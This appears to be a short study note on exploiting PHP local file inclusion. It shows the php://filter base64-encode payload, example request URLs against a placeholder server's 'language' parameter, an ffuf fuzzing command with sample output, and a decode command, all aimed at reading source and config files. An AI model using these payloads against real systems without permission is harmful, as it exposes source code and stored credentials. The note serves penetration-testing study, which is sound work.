## PHP Filters

Modern PHP applications (and those using frameworks like Laravel or Symfony) may be vulnerable to LFI. PHP wrappers can be abused to **extend LFI exploitation** and read source code even if `.php` files are normally executed.
### PHP Filter Wrapper

Using `php://filter` we can apply **conversion filters** like `convert.base64-encode` to a resource before including it. This helps **read PHP source code** instead of executing it.

**Payload:**

```
php://filter/read=convert.base64-encode/resource=filename
```

**Usage:**

```
http://<SERVER_IP>:<PORT>/index.php?language=php://filter/read=convert.base64-encode/resource=filename
```

This returns base64-encoded content of `filename.php` (.php is appended). You can decode it using:

```bash
echo '<encoded_string>' | base64 -d
```

> ✅ This is especially useful when the application **automatically appends `.php`**, or when source code is otherwise not readable.

### Fuzzing for Targets

Use ffuf or gobuster to find `.php` files to target:

```bash
ffuf -w /opt/useful/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://<SERVER_IP>:<PORT>/FUZZ.php
```
###### Output:

```bash
...SNIP...

index                   [Status: 200, Size: 2652, Words: 690, Lines: 64]
config                  [Status: 302, Size: 0, Words: 1, Lines: 1]
```
> ⚠️ Don’t ignore 301/302/403 responses — with LFI, you can still try reading those files directly.

You can extract referenced files from `index.php` as well.

```
http://<SERVER_IP>:<PORT>/index.php?language=config
```
###### This will not render the output so we use the filter to see the config file: 

```
http://<SERVER_IP>:<PORT>/index.php?language=php://filter/read=convert.base64-encode/resource=config
```
# Tags
> #Web-Exploitation #LFI #Filters